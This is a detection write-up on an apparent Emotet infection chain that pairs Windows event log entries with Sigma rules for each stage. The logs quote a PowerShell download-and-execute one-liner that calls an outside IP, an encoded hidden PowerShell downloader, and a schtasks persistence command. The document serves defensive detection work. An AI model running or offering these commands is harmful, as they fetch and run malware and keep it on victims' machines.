# The Emotet Infection Chain: Full Analysis

**Author:** Nihal
**Date:** 02-12-2025

---

## Event Logs


| **Time**     | **EventID** | **Parent Process**                                          | **Process / Image**                                         | **Activity / Command Line**                                                                                                                                                                                                                                                                                                                                                                | **User**    |
| :----------- | :---------- | :---------------------------------------------------------- | :---------------------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | :---------- |
| **09:15:22** | 4688        | `C:\Program Files\Microsoft Office\Office16\WINWORD.EXE`    | `C:\Windows\System32\cmd.exe`                               | **Process Create:** `C:\Windows\System32\cmd.exe /c powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://185.40.12.99/loader'))"`                                                                                                                                                                                                           | CONTOSO\Bob |
| **09:15:25** | 4688        | `C:\Windows\System32\cmd.exe`                               | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | **Process Create:** `powershell -w hidden -enc JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQA4ADUALgA0ADAALgAxADIALgA5ADkALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgAsACIAQwA6AFwAVQBzAGUAcgBzAFwAQgBvAGIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcADkAMgA4ADEALgBlAHgAZQAiACkAWw` | CONTOSO\Bob |
| **09:15:30** | 11          | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | *File System*                                               | **File Created:** `C:\Users\Bob\AppData\Local\Temp\9281.exe`                                                                                                                                                                                                                                                                                                                               | CONTOSO\Bob |
| **09:15:35** | 4688        | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | `C:\Windows\System32\schtasks.exe`                          | **Process Create:** `C:\Windows\System32\schtasks.exe /create /sc daily /tn "MaintenanceCheck" /tr "C:\Users\Bob\AppData\Local\Temp\9281.exe" /st 09:00 /f`                                                                                                                                                                                                                                | CONTOSO\Bob |
| **09:16:00** | 3           | *Unknown*                                                   | `C:\Users\Bob\AppData\Local\Temp\9281.exe`                  | **Network Conn:** `Destination IP: 185.40.12.99` `Destination Port: 443` `Protocol: TCP`                                                                                                                                                                                                                                                                                                   | CONTOSO\Bob |

---

### 1. The Entry Point: Word Spawning PowerShell

#### Event Log
| **Time** | **EventID** | **ParentImage** | **Image** | **CommandLine** | **User** |
| :--- | :--- | :--- | :--- | :--- | :--- |
| 09:15:22 | 4688 | `C:\Program Files\Microsoft Office\Office16\WINWORD.EXE` | `C:\Windows\System32\cmd.exe` | `C:\Windows\System32\cmd.exe /c powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://185.40.12.99/loader'))"` | CONTOSO\Bob |


#### Sigma Rule
```yaml
title: Office Application Spawning Command Shell
id: d4347781-678b-402f-9818-47214742a781
status: stable
description: Detects a Microsoft Office application (Word, Excel, PowerPoint) launching a command shell (cmd.exe or powershell.exe), which is a primary indicator of a macro-based attack.
author: Nihal
date: 2025-12-02
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    parentimage|contains:
      - 'WINWORD.EXE'
      - 'EXCEL.EXE'
      - 'POWERPNT.EXE'
  selection_child:
    image|contains:
      - 'cmd.exe'
      - 'powershell.exe'
  condition: selection_parent and selection_child
falsepositives:
  - Very rare legitimate macros used by finance teams (needs whitelisting).
level: critical
```

---


### 2. The Downloader: Obfuscated PowerShell

#### Event Log
| **Time** | **EventID** | **ParentImage**               | **Image**                                                   | **CommandLine**                                                                                                                                                                                                                                                                                                                                                        |
| :------- | :---------- | :---------------------------- | :---------------------------------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 09:15:25 | 4688        | `C:\Windows\System32\cmd.exe` | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | `powershell -w hidden -enc JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQA4ADUALgA0ADAALgAxADIALgA5ADkALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgAsACIAQwA6AFwAVQBzAGUAcgBzAFwAQgBvAGIAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAVABlAG0AcABcADkAMgA4ADEALgBlAHgAZQAiACkAWw` |

#### Sigma Rule
```yaml
title: Suspicious Encoded PowerShell Command
id: b19324e9-906d-4780-928f-7f99161a096c
status: stable
description: Identifies PowerShell processes running with hidden windows and encoded commands, a common technique used by downloaders to hide their code.
author: Nihal
date: 2025-12-02
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    image|contains: 'powershell.exe'
    commandline|contains|all:
      - '-w hidden'
      - '-enc'
  condition: selection
falsepositives:
  - Some legitimate admin scripts use encoding, but rarely combined with '-w hidden'.
level: high
```

---


### 3. The Landing: Dropping the Payload

#### Event Log
| **Time** | **EventID** | **Image**                                                   | **TargetFilename**                         |
| :------- | :---------- | :---------------------------------------------------------- | :----------------------------------------- |
| 09:15:30 | 11          | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` | `C:\Users\Bob\AppData\Local\Temp\9281.exe` |


#### Sigma Rule
```yaml
title: Executable Dropped in Suspicious Folder
id: c8479532-a548-4389-913a-44675543c081
status: experimental
description: Detects when an executable file is created in the AppData or Temp directories, especially by a scripting interpreter like PowerShell.
author: Nihal
date: 2025-12-02
logsource:
  category: file_event
  product: windows
detection:
  selection_creator:
    image|contains: 'powershell.exe'
  selection_file:
    targetfilename|endswith: '.exe'
    targetfilename|contains:
      - 'AppData\Local\Temp'
      - 'AppData\Roaming'
  condition: selection_creator and selection_file
falsepositives:
  - Software installers/updaters (exclude signed updaters).
level: medium
```

---


### 4. Persistence: Creating a Scheduled Task

#### Event Log
| **Time** | **EventID** | **Image** | **CommandLine** |
| :--- | :--- | :--- | :--- |
| 09:15:35 | 4688 | `C:\Windows\System32\schtasks.exe` | `C:\Windows\System32\schtasks.exe /create /sc daily /tn "MaintenanceCheck" /tr "C:\Users\Bob\AppData\Local\Temp\9281.exe" /st 09:00 /f` |


#### Sigma Rule
```yaml
title: Persistence via Scheduled Task in Temp
id: 42f04183-10e3-4638-b718-f2452336691c
status: stable
description: Detects the creation of a scheduled task that executes a binary located in a temporary or user profile directory.
author: Nihal
date: 2025-12-02
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    image|contains: 'schtasks.exe'
    commandline|contains|all:
      - '/create'
      - 'AppData'
  condition: selection
falsepositives:
  - Legitimate user-space applications (like Zoom) might use this, but it's rare.
level: high
```

---


### 5. The Callback: C2 Network Beacon

#### Event Log
| **Time** | **EventID** | **Image**                                  | **DestinationIp** | **DestinationPort** | **Protocol** |
| :------- | :---------- | :----------------------------------------- | :---------------- | :------------------ | :----------- |
| 09:16:00 | 3           | `C:\Users\Bob\AppData\Local\Temp\9281.exe` | 185.40.12.99      | 443                 | TCP          |


#### Sigma Rule
```yaml
title: Network Connection from Suspicious AppData Binary
id: a9812920-5341-4581-8848-032924151241
status: stable
description: Detects a process running from a temporary or AppData folder initiating an outbound network connection.
author: Nihal
date: 2025-12-02
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    image|contains:
      - 'AppData\Local'
      - 'AppData\Roaming'
      - 'Temp'
    image|endswith: '.exe'
    initiated: 'true'
  condition: selection
falsepositives:
  - Web browser updaters (Chrome/Edge updates often run from AppData).
level: medium
```